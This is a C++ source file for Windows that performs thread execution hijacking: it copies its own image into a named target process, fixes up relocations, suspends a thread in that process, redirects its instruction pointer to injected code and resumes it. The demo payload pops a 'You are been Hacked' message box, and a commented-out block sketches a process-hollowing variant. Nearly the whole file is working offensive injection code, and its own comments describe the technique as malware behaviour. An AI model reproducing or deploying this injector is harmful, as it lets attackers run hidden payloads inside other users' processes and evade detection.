#include <Windows.h>
#include <stdio.h>
#include <cmath>
#include <iostream>
#include <TlHelp32.h>
#include <comdef.h>
#include <tchar.h>
#define DEBUG

//TODO: save the registers for return after your function and not crush the program

DWORD WINAPI ThreadInject(PVOID64 Param);
DWORD GetProcID(std::string ProcName);
void DbgPrint(const char *msg);


int main(int argc, char * argv[])
{
	HANDLE hProcess, hThread, hSnap = NULL;

	if (argc != 2)
	{
		printf("Usage: < ThreadExecutionHijacking.exe <targer process name> \n");
		getchar();
		return 0;
	}

	std::string processName(argv[1]);
	DWORD processId = GetProcID(processName);// find process ID
		
	hProcess = OpenProcess(THREAD_ALL_ACCESS, FALSE, processId);
	if (!hProcess) {
		printf("[*] Cannot open target process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	
	THREADENTRY32 te32;
	te32.dwSize = sizeof(te32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(hSnap, &te32);
	printf("\nFinding a thread to hijack.\n");
	BOOL threadFound = false;
	while (Thread32Next(hSnap, &te32))
	{
		if (te32.th32OwnerProcessID == processId)
		{
			printf("\nTarget thread found. Thread ID: %d\n", te32.th32ThreadID);
			threadFound = true;
			break;
		}
	}
	if (!threadFound)
	{
		printf("[*] Cannot find the thread from processID\n");
		getchar();
		return 0;
	}
	CloseHandle(hSnap);
	//now we parse this executble
	PVOID64 imageBase = GetModuleHandle(NULL);
	if (!imageBase) {
		printf("[*] Cannot get image base of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PIMAGE_DOS_HEADER dosHeader = NULL;
	dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	if (!dosHeader) {
		printf("[*] Cannot get image dos header of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PIMAGE_NT_HEADERS ntHeader = NULL;
	ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)imageBase + dosHeader->e_lfanew);
	if (!ntHeader) {
		printf("[*] Cannot get image nt headers of current process. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}
	//now we have all what we need from the executble

	PVOID64 allocatedMem = NULL;
	allocatedMem = VirtualAllocEx(hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!allocatedMem) {
		printf("[*] Cannot allocate target process memory. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	PVOID64 Buffer = NULL;
	Buffer = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Buffer) {
		printf("[*] Cannot allocate current process memory. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	memcpy(Buffer, imageBase, ntHeader->OptionalHeader.SizeOfImage);
	//now we need to reset the relocation table to fit the image base of the target process
	PIMAGE_BASE_RELOCATION baseRelocation = NULL;
	baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)Buffer + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	if (!baseRelocation) {
		printf("[*] Cannot get image base relocation. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	ULONG64 Delta = NULL;
	Delta = (ULONG64)allocatedMem - (ULONG64)imageBase;

	if (!Delta) {
		printf("[*] Cannot calculate allocated image size. Error num: %d\r\n", GetLastError());
		getchar();
		return 0;
	}

	ULONG64 Count = 0, i = 0, *p = NULL;
	PUSHORT Offset;
	while (baseRelocation->VirtualAddress)
	{
		if (baseRelocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			Count = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			Offset = (PUSHORT)(baseRelocation + 1);
			for (i = 0; i < Count; i++)
			{
				if (Offset[i]) {
					p = (PULONG64)((PUCHAR)Buffer + baseRelocation->VirtualAddress + (Offset[i] & 0x0FFF));
					*p += Delta;
				}
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)baseRelocation + baseRelocation->SizeOfBlock);
	}
	//oh that was exhausting , now we can finnly to write it to the target process
	BOOL bWrite = FALSE;
	bWrite = WriteProcessMemory(hProcess, allocatedMem, Buffer, ntHeader->OptionalHeader.SizeOfImage, NULL);
	if (!bWrite) {
		printf("[*] Cannot write target memory. Error num: %d\r\n", GetLastError());
		VirtualFreeEx(hProcess, allocatedMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		getchar();
		return 0;
	}

	VirtualFree(Buffer, 0, MEM_RELEASE);

	//From now it's start the cool stuff , we whnt to SUSPEND, INJECT, AND RESUME (SIR)) 
	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);

	if (!hThread)
	{
		printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());

		VirtualFreeEx(hProcess, Buffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -1;
	}

	printf("\nSuspending target thread.\n");

	if (SuspendThread(hThread) == -1)	//Suspend thread to hijack
	{
		DbgPrint("[-] Failed to stop remote process");
		return FALSE;
	}
	LPCONTEXT remoteProcessContext = new CONTEXT();		//This is a debugging structure to hold the old process "context" like registers and whatnot
	remoteProcessContext->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, remoteProcessContext))	//get context to be used to restore process
	{
		DbgPrint("Failed to get debugging context of remote process");
		return FALSE;
	}
	DbgPrint("[+] saved process context\n");

	DbgPrint("[*] modifying proc context RCX->EntryPoint()");
	// modifies the Rip register (a register that contains the address of the next instruction) of the targeted thread by calling SetThreadContext.
	//Afterwards, malware resumes the thread to execute the shellcode that it has written to the host process
	auto dwShellCodeAddress = reinterpret_cast<ULONG64>(ThreadInject) + Delta;
	remoteProcessContext->Rip = dwShellCodeAddress;			//Set Rip register to the shellcode

	DbgPrint("[ ] restoring modified context");
	if (!SetThreadContext(hThread, remoteProcessContext))
	{
		DbgPrint("[-] failed to set remote process context");
		return FALSE;
	}
	if (!GetThreadContext(hThread, remoteProcessContext))
	{
		DbgPrint("[-] failed to set control thread context");
		return FALSE;
	}
	DbgPrint("[+] restored process context\n");

	DbgPrint("[ ] resuming hijacked process");
	if (!ResumeThread(hThread))
	{
		DbgPrint("[-] failed to resume remote process");
		return FALSE;
	}
	DbgPrint("[!] process hijacked!");
	DbgPrint("===================Et Fin!=========================");


}


DWORD WINAPI ThreadInject(PVOID64 Param)
{
	MessageBox(NULL, L"You are been Hacked by Hackers Gruop!", L"Alert!!", MB_ICONINFORMATION);
	return 0;
}

DWORD GetProcID(std::string ProcName)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	do {
		//translate wchar to char
		_bstr_t b(pe32.szExeFile);
		char * processName = b;
		if (strcmp(processName, ProcName.c_str()) == 0)
		{
			DWORD ProcId = pe32.th32ProcessID;
			CloseHandle(hProcessSnap);
			return ProcId;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return 0;
}

void DbgPrint(const char *msg)
{

#ifdef DEBUG
	DWORD eMsgLen, errNum = GetLastError();
	LPTSTR lpvSysMsg;

	if (msg)
		printf("%s: ", msg);
	eMsgLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, errNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpvSysMsg, 0, NULL);
	if (eMsgLen > 0)
		_ftprintf(stderr, _T("%d %s\n"), errNum, lpvSysMsg);
	else
		_ftprintf(stderr, _T("Error %d\n"), errNum);
	if (lpvSysMsg != NULL)
		LocalFree(lpvSysMsg);
#endif
}



//auto pStartupInfo = new STARTUPINFO();  // Specifies the window station, desktop, standard handles, 
//										// and appearance of the main window for a process at creation time.
//										// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
//
//auto remoteProcessInfo = new PROCESS_INFORMATION();  // Structure that contains the information about a process object
//													 // MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
//DbgPrint("===================================================\n\n");
//DbgPrint("============Creating Process to Infect=============");
//
///* CreateProcess is a complex call so I am breaking it out into paramaters*/
////MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
//DbgPrint("[ ]Creating host process");
//WCHAR *   appName;
//
//appName = new WCHAR[strlen(argv[1]) + 1]{};
//MultiByteToWideChar(0, 0, argv[1], strlen(argv[1]), appName, strlen(argv[1]) + 1);
//CreateProcess(appName,			//lpApplicationName		name of process to be executed
//	nullptr,					//lpCommandLine			command line to be executed (not used so Application name is used)
//	nullptr,					//lpProcessAttributes	user specified process params using SECURITY_ATTRIBUTES struct
//	nullptr,					//lpThreadAttributes	user specified thread params using SECURITY_ATTRIBUTES struct
//	FALSE,						//bInheritHandles		Disallow the inheritance of process handles to child processes (we are not a child thread)
//	NORMAL_PRIORITY_CLASS,		//dwCreationFlags		Flag to priotiry level of the process (here we are normal)
//	nullptr,					//lpEnvironment			Enviromental Vars to hand to the new process (perhaps useful for modified mimikatz?)
//	nullptr,					//lpCurrentDirectory	used to declare working directory for process (normally used by shells that need to start at $HOME)
//	pStartupInfo,				//lpStartupInfo			Our startupinfo object for process info
//	remoteProcessInfo);				//lpProcessInformation	The processinformation object we use to manipulate the process
//
//delete appName;
//if (!remoteProcessInfo->hProcess)	// no real need to check the output of Create Process because all the return info needs to be checked anyway
//{
//	DbgPrint("[-] Failed to create remote thread");
//	return FALSE;
//}
//if (SuspendThread(remoteProcessInfo->hThread) == -1)	//Suspend thread to hijack
//{
//	DbgPrint("[-] Failed to stop remote process");
//	return FALSE;
//}